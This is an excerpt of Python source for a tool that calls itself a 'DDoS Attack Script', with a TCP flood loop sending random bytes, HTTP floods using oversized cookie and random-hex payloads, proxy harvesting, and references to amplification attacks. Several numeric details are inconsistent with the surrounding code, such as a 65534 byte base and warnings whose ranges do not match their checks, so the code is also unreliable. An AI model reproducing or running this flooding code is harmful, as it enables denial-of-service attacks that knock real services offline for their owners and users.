...
class Tools:
    ...
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        ...
        if i > 0:
            base = 65534 if binary else 1000
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1021)):
                continue
        Tools.safe_close(s)
...
class HttpFlood(Thread):
    ...
    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            ...
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(65534, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(3102400)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
    ...
    def RHEX(self):
        randhex = str(randbytes(randchoice([102400, 577, 128])))
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* ROCKY - DDoS Attack Script With %d Methods\n'
    ...
    if not proxy_li.exists():
        ...
        with proxy_li.open("w") as wr:
            ...
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=65534, threads=threads,
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/ROCKY/ROCKY/wiki/BOMB-method"
                    )
                ...
                if threads > 65534 or threads < 100:
                    logger.warning("Thread is higher than 1 - 65534")
                if rpc > 65534 or rpc < 100:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 1 - 65534")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/ROCKY/ROCKY/wiki/Amplification-ddos-attack")
